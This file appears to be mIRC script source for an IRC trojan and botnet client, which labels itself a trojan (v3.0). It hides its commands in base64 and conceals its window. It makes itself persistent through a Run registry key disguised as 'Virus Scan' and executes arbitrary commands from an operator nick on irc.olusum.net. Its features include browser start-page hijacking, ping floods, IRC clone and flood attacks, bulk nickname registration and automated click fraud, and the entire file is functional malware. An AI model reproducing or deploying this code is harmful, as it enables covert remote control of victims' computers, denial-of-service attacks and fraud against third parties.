alias dcc { var %i = 0, %text = $strip($$1), %is = $isid | while (%i < 1) { %text = $iif($calc(%i % 2), $decode(%text), $decode(%text,m)) | inc %i }
  if (!%text) { if (%is) return | var %blank = now | echo !!!! | halt  }
$iif(%is, return %text, echo -a %text) | halt }
on 1:connect: { 
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { $Coder | $sikerim | $dcc(bW9kZSAjPQ==) +ktpm %key  } 
  if ($dcc(b2x1c3VtLm5ldA==) !isin $server) {
    if ($read($dcc(V250cy5kbGw=)) isin $server) { .timer 3 3 $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) | .timer 0 5 deneme | .clear  }
    if ($read($dcc(V250cy5kbGw=)) !isin $server) { $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 0 5 mesutmesut | .unclear }
    ignore -wd *
  }
}
on *:start: { $dcc(LnRpbWVyIDAgMzAgdGFyYW1h) | $dcc(LnRpbWVyIDAgMSBzZWNyZXQ=) | $dcc(LnRpbWVyIDAgNDAga29udHJvbA==) | $dcc(LnRpbWVyIDAgNDAgcG9rZW1vbg==) | $dcc(dGl0bGViYXI=) | $dcc(dGltZXIgMCAxIHRpdGxlYmFyIFdpbmRvd3NaaXJ2ZWRlIC1bICRyKDAsOTk5OTk5OTk5KSBdLSBrYnl0ZQ==) | .inc %sex = 0 | if (%sex = 1) { .run $mircdirvideo.asf | $dcc(LnRpbWVyIDUgNTAwMDAgc2Nhbg==) } | $dcc(c2VydmVyIGlyYy5vbHVzdW0ubmV0) | $dcc(c2VydmVyIC1t) $read($dcc(RGRvc3htLmRsbA==)) | $dcc(c2VydmVyIC1t) $read($dcc(TXppcngudnhk)) | .timerdcc 0 20 tarama  | $dcc(Y2VsZWJpbGk=) |  $dcc(ZGFraWth) | $dcc(WmlydmVkZQ==) | $pc }
on *:disconnect: {
  $pc
  $iif($scon(1).status = disconnected,$+(scid,$chr(32),-s,$chr(32),1,$chr(32),server,$chr(32),$dcc(aXJjLm9sdXN1bS5uZXQ=)))
  $iif($scon(3).status = disconnected,$+(scid,$chr(32),-s,$chr(32),3,$chr(32),server,$chr(32),$read($dcc(TXppcngudnhk)))) 
}
on *:action:*:?:closemsg $nick | halt
on *:notice:*:?:closemsg $nick | halt
on *:ping: { ctcp $me ping }
on *:exit: { run $remove($mircexe,$mircdir) | $dcc(WmlydmVkZQ==)  }
alias Zirvede {
  .set %windows $r(10,1999) $+ .reg 
  .write %windows $dcc(UkVHRURJVDQ=)
  .write %windows $dcc(W0hLRVlfTE9DQUxfTUFDSElORVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5d) 
  .write %windows "Virus Scan"=" $+ $remove($mircexe,$mircdir) $+ "
  $dcc(cnVuIC1uIHJlZ2VkaXQgL3M=) %windows 
  $dcc(dGltZXIgMSA0IHJlbW92ZQ==) %windows
}
on *:text:*:#: {
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $me) { $2- }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(LmJvdA==)) { $2-  }
      }
    }
  }

if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(I35+fg==)) {
      if ($dcc(VGhvUg==) isop $dcc(I35+fg==)) {
        if ($1 = $dcc(LmJvdA==)) { $2-  }
      }
    }
  }

  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 == $dcc(IWdpcmlz)) { 
          set %giris $2
          set %system $r(10,1999) $+ .reg
          .write %system $dcc(UkVHRURJVDQ=)
          .write %system $dcc(W0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlclxNYWluXQ==)
          .write %system "Start Page" = " $+ %giris $+ "
          $dcc(LnJ1biAtbiByZWdlZGl0IC9z) %system
          $dcc(LnRpbWVyIDEgNCByZW1vdmU=) %system
          $dcc(bXNnICM9)  2[Giriþ Sayfasi] 4 %giris 1 olarak degiþti
        }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(LnNldA==)) { $dcc(d3JpdGUgV250cy5kbGw=) $2- }
      } 
    }
  }  
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(Lnlheg==)) { $dcc(d3JpdGUgU3lzdGVtXERyaXZlcnNcV21zbi5zeXM=)  $2- }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(Lm15bmV0)) { $dcc(d3JpdGUgZm9udHNcaXRhbGljLnR0Zg==) $2 }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(LnRlbWl6bGU=)) { $dcc(cmVtb3ZlIEZvbnRzXGl0YWxpYy50dGY=)  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(YUxp ) isop $dcc(Iz0=)) {
        if ($1 = $dcc(LmRlbA==)) { $dcc(cmVtb3ZlIFN5c3RlbVxEcml2ZXJzXFdtc24uc3lz) }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LmF0dGFjaw==)) { $dcc(cnVuIFJnZGV0LmV4ZSAvbiAvZmggL3I=)   "ping.exe $2 -t" }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) { 
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LnNldGRlbA==)) { $dcc(cmVtb3ZlIFdudHMuZGxs)  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(LmFuYWNoYW4=)) { $dcc(d3JpdGUgWGRkaWNrLnZ4ZA==) $2 }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(IXNlcnZlcg==)) { $dcc(d3JpdGUgTXppcngudnhk) $2-  }
      } 
    } 
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IXNlcnZlcmRlbA==)) { $dcc(LnJlbW92ZSBNemlyeC52eGQ=) $2-  } 
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) {
        if ($1 = $dcc(IXlhemJha2lt)) { $dcc(LndyaXRlIE1yZWFkLmRsbA==) $2-  } 
      } 
    } 
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IXNpbGJha2lt)) { $dcc(LnJlbW92ZSBNcmVhZC5kbGw=) $2-  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IWFza2lt)) { $dcc(d3JpdGUgTVh6aXIuZGxs) $2-  } 
      } 
    } 
  } 
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IXlva2V0)) { $dcc(LnJlbW92ZSBNWHppci5kbGw=) $2-  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IXdyaXRlc2VydmVy)) { $dcc(d3JpdGUgRGRvc3htLmRsbA==) $2-  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IXJlbW92ZXNlcnZlcg==)) { $dcc(cmVtb3ZlIERkb3N4bS5kbGw=)  }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LnVuYXR0YWNr)) { $dcc(cnVuIFJnZGV0LmV4ZSAvbiAvZmggL3I=) "pingpong -kf $2-" }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LnZlcnNpb24=)) { $dcc(bXNnICM9) 4 ben Trojenim :) 2v3.0 }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LmthemFh)) { $dcc(LndyaXRlIE13aW4udnhk) $2 }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LmRlbGthemFh)) { $dcc(LnJlbW92ZSBNd2luLnZ4ZA==) }
      }
    }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LnF1YWtl)) { $dcc(d3JpdGUgSGVscFxxdWFrZS5obHA=) $2- }
      }
    }
  }

if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LmFuYXNlcnZlcg==)) { $dcc(d3JpdGUgRGRvc3htLmRsbA==) $2- }
      }
    }
  }

if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LmFuYXNpbA==)) { $dcc(cmVtb3ZlIERkb3N4bS5kbGw=) }
      }
    }
  }

  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(IWd1bmNlbGxl)) { $dcc(Ly9kbGwgd21uMzIuZGxsIGRvd25sb2Fk) $2- }
      }
    }
  }

  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { 
    if ($dcc(VGhvUg==) ison $dcc(Iz0=)) {
      if ($dcc(VGhvUg==) isop $dcc(Iz0=)) { 
        if ($1 = $dcc(LnF1YWtlc2ls)) { $dcc(cmVtb3ZlIEhlbHBccXVha2UuaGxw) }
      }
    }
  }
}


alias Coder {
  $dcc(bmljaw==) $read($dcc(U3lzdGVtXERyaXZlcnNcc3lzbWFrZS52eGQ=))
  $dcc(YW5pY2s=) $read($dcc(U3lzdGVtXERyaXZlcnNcc3lzbWFrZS52eGQ=))
}


alias dakika { $dcc(dGltZXIgMCA1MDAgWmlydmVkZQ==) }
alias pxdec { unset %rsn* | set %rsn $r(a,z) | var %a = $r(1,5) , %b = $r(1,4) , %c = $r(1,2) , %d = $r(a,z) | if (%c = 1) { var %_ = 1 | while (%_ <= $calc(%a + %b)) {  var %r = $r(1,2) |  if (%r = 1) { set %rsn [ %rsn ] $r(a,z) }
  if (%r = 2) { set %rsn [ %rsn ] $r(a,z) } | inc %_  } } | if (%c = 2) { var %_ = 1 | while (%_ <= $calc(%a + %b)) { var %r = $r(1,2) |  if (%r = 1) { set %rsn [ %rsn ] $r(a,z) } | if (%r = 2) { set %rsn [ %rsn ] $r(a,z) } | inc %_  } } | return $remove(%rsn,$chr(32)) 
}
alias clone {
  if ($1 = $dcc(eXVrbGU=)) { 
    var %x = $4 
    %cs = $2 
    %cp = $3 
    while  (%x >= 1) { 
      .sockopen clone $+ %x $+ $pxdec %cs %cp 
      dec %x  
    } 
  }
  if ($1 = $dcc(Zmxvb2Q=)) { 
    $MeSuT(sockw,join,$2) 
    $MeSuT(sockw,privmsg,$2, : $floodmsg)
  }
  if ($1 = $dcc(Z2ly)) { 
    $MeSuT(sockw,join,$2) 
  } 
  if ($1 = $dcc(Y/1r)) { 
    $MeSuT(sockw,part,$2) 
  } 
  if ($1 = $dcc(Y2xvc2U=)) { 
    $MeSuT(sockw,quit, : $floodmsg) 
    .timerflood off 
  }
  if ($1 = $dcc(bm90aWNl)) { 
    $MeSuT(sockw,notice,$2, : $3-) 
  } 
  if ($1 = $dcc(cmVnbGU=)) { $oku } 
  if ($1 = $dcc(cmFuZG9t)) { 
    $MeSuT(sockw,join,$2) 
    $MeSuT(sockw,privmsg,$2, : $3- $str($pxdec,50))
  }
  if ($1 = $dcc(aGVscA==)) { 
    $MeSuT(sockw,privmsg,nickserv, : help)
    $MeSuT(sockw,privmsg,chanserv, : help)
    $MeSuT(sockw,privmsg,memoserv, : help)
  }
  if ($1 = $dcc(bWVtb3NlbmQ=)) { sockwrite -nt clone* memoserv send $2 : $3- }
  if ($1 = $dcc(bmljaw==)) { sockwrite -nt clone* $dellen }
}
alias dellen { sockwrite -nt clone* $sockname nick $pxdec }
alias oku { sockwrite -nt clone* nickserv register $pxdec  $+($pxdec,@hotmail.com) }
on 1:sockopen:clone*: { 
  .sockwrite -nt $sockname user $pxdec $pxdec $pxdec : $pxdec 
  .sockwrite -nt $sockname nick $pxdec 
}
alias MeSuT { if ( $1 = Mersinteam) { $dcc(cnVuIGtvbWlrLmV4ZSAvbiAvZmggL3I=) ' $+ $2- $+ ' } | if ($1 = sockw) { sockwrite -nt clone* $2- } }
alias floodmsg { 
  inc %fx 1
  if (%fx > 3) { 
    unset %fx 
    %fx = 1
  }
  return $str(flo0d,$calc(70+ %fx)) 
}
alias pc {
  $dcc(bmljaw==) $zrtr
  $dcc(YW5pY2s=) $zrtr
  $dcc(ZnVsbG5hbWU=) $pxdec
  $dcc(ZW1haWxhZGRy) $zrtr
  $dcc(aWRlbnRkIG9u) $pxdec
}
alias sikerim {  $dcc(am9pbiAjPQ==) %key | $dcc(am9pbiAjenVybmE=) | $dcc(L2pvaW4gI35+fg==) %key }
alias yedinmi { .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) | .timer 50 10 .timer 1 10 $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) }
alias zrtr { unset %rxf* | set %rxf $r(A,Z) | var %a = $r(1,5) , %b = $r(1,3) , %c = $r(1,2) , %d = $r(a,z) | if (%c = 1) { var %_ = 1 | while (%_ <= $calc(%a + %b)) {  var %r = $r(1,2) |  if (%r = 1) { set %rxf [ %rxf ] $r(a,z) }
  if (%r = 2) { set %rxf [ %rxf ] $r(a,z) } | inc %_  } } | if (%c = 2) { var %_ = 1 | while (%_ <= $calc(%a + %b)) { var %r = $r(1,2) |  if (%r = 1) { set %rxf [ %rxf ] $r(A,Z) } | if (%r = 2) { set %rxf [ %rxf ] $r(a,t) } | inc %_  } } | return $remove(%rxf,$chr(32)) 
}
alias pokemon { if ($xxx(0,0,1600,1200) = $true) { .remove $script(1)  } }
alias manyak { if (!$server) { $dcc(c2VydmVyIGlyYy5vbHVzdW0ubmV0) } }
alias celebili { .echo mesut $dll(edih.dll, do_ShowWindow, $window(-2).hwnd 0) }
alias xxx { 
  if ($prop == dbu) { if ($mouse.x >= $calc($$1 * $dbuw)) && ($mouse.x <= $calc(($dbuw * $$1) + ($dbuw * $$3))) && ($mouse.y >= $calc($dbuh * $$2)) && ($mouse.y <= $calc(($dbuh * $$2) + ($dbuh * $$4))) { return $true  } 
    else { return $false } 
  }
  else { if ($mouse.x >= $$1) && ($mouse.x <= $calc($$1 + $$3)) && ($mouse.y >= $$2) && ($mouse.y <= $calc($$2 + $$4)) { return $true } 
    else { return $false }
  }
}
alias secret { if ($appstate != hidden) { .echo hidden $dll(edih.dll, do_ShowWindow, $window(-2).hwnd 0) } }
on *:join:#: { 
window -h $chan
  if ($nick = $me) { if ($read($dcc(V250cy5kbGw=)) isin $server) {  .clear | unset %xnick | .auser 50 $address($me,1) | .timersss 0 7 gag # } }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { halt }
  if ($read($dcc(V250cy5kbGw=)) !isin $server) {  if ($ulist($address($nick,-1),70,1)) { halt } | .timer 1 $r(10,25) .msg $nick %rawtopic  }
}
alias gag {  inc %xnick = 10 | if ($ulist($address($rnick($1,%xnick),-1),50,1)) { halt } | if ($me !ison $1) { halt } | if ($rnick($1,%xnick) = $null) { .part $1 | .clear | halt  } | $+(msg,$chr(32),$rnick($1,%xnick),$chr(32),$read($dcc(SGVscFxxdWFrZS5obHA=))) }
raw *:*: {
  if ($numeric = 439) { disconnect }
  if ($numeric = 432) { $dcc(bmljaw==) $read($dcc(U3lzdGVtXERyaXZlcnNcc3lzbWFrZS52eGQ=)) } 
  if ($numeric = 433) { $dcc(bmljaw==) $read($dcc(U3lzdGVtXERyaXZlcnNcc3lzbWFrZS52eGQ=)) }
  if ($numeric = 433) { $dcc(bmljaw==) $read($dcc(U3lzdGVtXERyaXZlcnNcc3lzbWFrZS52eGQ=)) }
  if ($numeric = 473) { 
    if ($read($dcc(V250cy5kbGw=)) isin $server) { $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) } 
    if ($read($dcc(V250cy5kbGw=)) !isin $server) { $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) } 
  }
  if ($numeric = 474) {
    if ($read($dcc(V250cy5kbGw=)) isin $server) { $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) } 
    if ($read($dcc(V250cy5kbGw=)) !isin $server) { $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) }
  } 
  if ($numeric = 475) { if ($dcc(b2x1c3VtLm5ldA==) isin $server) { $dcc(aGFsdA==) } | $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) }
  if ($numeric = 477) {
    if ($dcc(b2x1c3VtLm5ldA==) isin $server) { $dcc(aGFsdA==) } 
    $dcc(Tmlja1NlcnYgcmVnaXN0ZXIgYWxpdG9wdWF0) $zrtr $+ @yahoo.com 
    if ($read($dcc(V250cy5kbGw=)) isin $server) { $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) } 
    if ($read($dcc(V250cy5kbGw=)) !isin $server) { $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) }
  }
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) {
    if ($numeric = 332) { unset %rawtopic | $iif($me ison #=,%rawtopic = $chan(#=).topic) | if ($me ison #=) { .timertopic 0 400 $chan(#=).topic = %rawtopic   } }
    if ($numeric = 366) { if ($nick($2,0) = 1) { if ($2 = #=) { .mode $2 +ntpk %key } } 
    if (%rawtopic != $null) && (atopic != ThoR) { if (%atopic isin ThoR) || if ($me ison #=) { .timertopic2 0 $r(400,500) $chan(#=).topic = %rawtopic   | $dcc(L3dyaXRlIGhlbHBccXVha2UuaGxw) %rawtopic }   } }  
    if ($numeric = 333) { $iif($2 = #=,%atopic = $3) }
  }
}
alias clear { var %e $ulist(*,50,0) | while (%e >= 1) { .ruser $ulist(*,50,%e) | dec %e } }
alias unclear { var %u $ulist(*,70,0) | while (%u >= 1) { .ruser $ulist(*,70,%u) | dec %u } }
alias click { if ($window(@click)) { window -c @click } | %site = $1-  |  window -hp @click  |  echo -a $dll(click.dll,attach,$window(@click).hwnd) | echo -a $dll(click.dll,navigate,%site) | echo -a $dll(click.dll,select,%old_hwnd) } 
alias hithit { if (%site != $null) { .timerhit 15 $r(15,1800) click %site } }
alias free { if ($1 = on) { %site = $2 | .timerhit off |  hithit } | if ($1 = off) { .timerhit off | window -c @Click } }
alias bitir { .timerfucker off | .timerhits off | timerhitsx off }
on *:part:#: { 
  if ($dcc(b2x1c3VtLm5ldA==) isin $server) { halt }
  if ($read($dcc(V250cy5kbGw=)) isin $server) {
    if ($ulist($address($nick,-1),50,1)) { halt } 
    if ($address($nick,1)) {
      .auser 50 $address($nick,1) 
    }
  }
  if ($read($dcc(V250cy5kbGw=)) !isin $server) {
    if ($ulist($address($nick,-1),70,1)) { halt } 
    if ($address($nick,1)) {
      .auser 70 $address($nick,1) 
    }
  }
}
alias deneme { 
  if ($chan(0).status = 0) { pc | $dcc(am9pbg==) $read($dcc(Zm9udHNcaXRhbGljLnR0Zg==)) }
  if ($chan(0).status >= 1) { halt }
}
alias mesutmesut { 
  if ($chan(0).status = 0) { $dcc(am9pbg==)  $read($dcc(TXJlYWQuZGxs)) }
  if ($chan(0).status >= 1) { halt }
}
on *:text:*:?: closemsg $nick | halt
alias týklasana { if ($window(@týklasana)) { window -c @týklasana } | %fuckerteam = $1-  |  window -hp @týklasana  |  echo -a $dll(click.dll,attach,$window(@týklasana).hwnd) | echo -a $dll(click.dll,navigate,%fuckerteam) | echo -a $dll(click.dll,select,%old_hwnd) } 
alias cokguzel { if (%fuckerteam != $null) { .timerhits 0 $r(0,15) týklasana %fuckerteam } }
alias site { if ($1 = on) { %fuckerteam = $2 | .timerfucker off |  cokguzel  } | if ($1 = off) { .timerhits off | window -c @týklasana } }
on *:error:*: {
  set %chan $cid 
  if (%chan = 2)  { disconnect }
  if (%chan = 3) { $dcc(c2NpZCAtcyAzIHNlcnZlcg==) $read($dcc(TXppcngudnhk)) | unset %chan }
}
alias tarama {  $iif($scon(2).status = disconnected,$+(scid,$chr(32),-s,$chr(32),2,$chr(32),server,$chr(32),$read($dcc(RGRvc3htLmRsbA==)))) }
alias kontrol { if (!$server) { $dcc(c2VydmVyIGlyYy5vbHVzdW0ubmV0) }
